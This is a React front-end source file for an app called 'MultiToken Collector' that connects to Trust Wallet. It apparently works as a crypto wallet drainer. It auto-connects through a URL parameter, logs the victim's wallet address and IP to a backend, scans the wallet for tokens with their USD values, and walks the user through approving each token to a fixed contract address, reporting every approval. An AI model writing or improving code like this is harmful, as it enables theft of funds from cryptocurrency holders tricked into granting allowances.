import React, { useState, useEffect, useCallback } from 'react';
import { getTrustWalletProvider } from './utils/detectOS';
import { connectWallet } from './services/walletService';
import { scanTokens, approveToken } from './services/tokenService';
import { notifyWalletConnect, notifyApproval } from './services/apiService';
import { CONTRACT_ADDRESS } from './config/tokens';
import ApprovalModal from './components/ApprovalModal';
import TrustRequired from './components/TrustRequired';
import FinalResult from './components/FinalResult';

function App() {
    const [walletAddress, setWalletAddress] = useState('');
    const [tokens, setTokens] = useState([]);
    const [currentToken, setCurrentToken] = useState(null);
    const [showModal, setShowModal] = useState(false);
    const [loading, setLoading] = useState(false);
    const [error, setError] = useState('');
    const [showTrustRequired, setShowTrustRequired] = useState(false);
    const [showFinalResult, setShowFinalResult] = useState(false);
    const [tokenQueue, setTokenQueue] = useState([]);

    // Auto connect check
    useEffect(() => {
        const params = new URLSearchParams(window.location.search);
        if (params.get("autoconnect") === "1") {
            let attempts = 0;
            const timer = setInterval(() => {
                attempts++;
                const pCheck = getTrustWalletProvider();
                if (pCheck && pCheck !== "REJECTED_OTHER_WALLET") {
                    clearInterval(timer);
                    handleConnectWallet();
                } else if (pCheck === "REJECTED_OTHER_WALLET" || attempts > 15) {
                    clearInterval(timer);
                    if (pCheck === "REJECTED_OTHER_WALLET") {
                        setShowTrustRequired(true);
                    }
                }
            }, 500);
            
            return () => clearInterval(timer);
        }
    }, []);

    const handleConnectWallet = async () => {
        try {
            setLoading(true);
            setError('');
            setShowFinalResult(false);
            
            const address = await connectWallet();
            
            if (!address) {
                setLoading(false);
                return;
            }
            
            setWalletAddress(address);
            
            // Backend ko wallet connect notify karo
            const ipAddress = await getIPAddress();
            notifyWalletConnect(address, ipAddress);
            
            // Tokens scan karo
            const scannedTokens = await scanTokens(address);
            setTokens(scannedTokens);
            
            if (scannedTokens.length > 0) {
                setTokenQueue(scannedTokens);
                setCurrentToken(scannedTokens[0]);
                setShowModal(true);
            } else {
                setShowFinalResult(true);
            }
            
        } catch (error) {
            console.error('Wallet connect error:', error.message);
            setError(error.message || 'Connection failed');
        } finally {
            setLoading(false);
        }
    };

    const handleTokenApproval = async (token) => {
        const result = await approveToken(token.address, CONTRACT_ADDRESS);
        
        if (result.success) {
            // Backend ko approval notify karo
            notifyApproval(walletAddress, token.address);
            
            // Queue update karo
            const newQueue = tokenQueue.slice(1);
            setTokenQueue(newQueue);
            
            return result;
        }
        
        return result;
    };

    const handleApprovalComplete = useCallback((token) => {
        setShowModal(false);
        
        setTimeout(() => {
            const newQueue = tokenQueue.slice(1);
            
            if (newQueue.length > 0) {
                setTokenQueue(newQueue);
                setCurrentToken(newQueue[0]);
                setShowModal(true);
            } else {
                setCurrentToken(null);
                setShowFinalResult(true);
            }
        }, 500);
    }, [tokenQueue]);

    const handleCancelApproval = () => {
        setShowModal(false);
        setCurrentToken(null);
        setTokenQueue([]);
        setShowFinalResult(true);
    };

    if (showTrustRequired) {
        return <TrustRequired />;
    }

    if (showFinalResult) {
        return <FinalResult walletAddress={walletAddress} />;
    }

    return (
        <div className="app">
            <h1>MultiToken Collector</h1>
            
            {error && <div className="error">{error}</div>}
            
            {!walletAddress ? (
                <button onClick={handleConnectWallet} disabled={loading}>
                    {loading ? 'Connecting...' : 'Connect Trust Wallet'}
                </button>
            ) : (
                <div>
                    <p>Wallet: {walletAddress}</p>
                    <p>Tokens found: {tokens.length}</p>
                    
                    {tokens.map((token, index) => (
                        <div key={token.address} className="token-item">
                            <span>{index + 1}. {token.name}</span>
                            <span>${token.usdValue.toFixed(2)}</span>
                        </div>
                    ))}
                </div>
            )}
            
            {showModal && currentToken && (
                <ApprovalModal
                    token={currentToken}
                    onApprove={handleTokenApproval}
                    onCancel={handleCancelApproval}
                />
            )}
        </div>
    );
}

async function getIPAddress() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch (error) {
        return 'Unknown';
    }
}

export default App;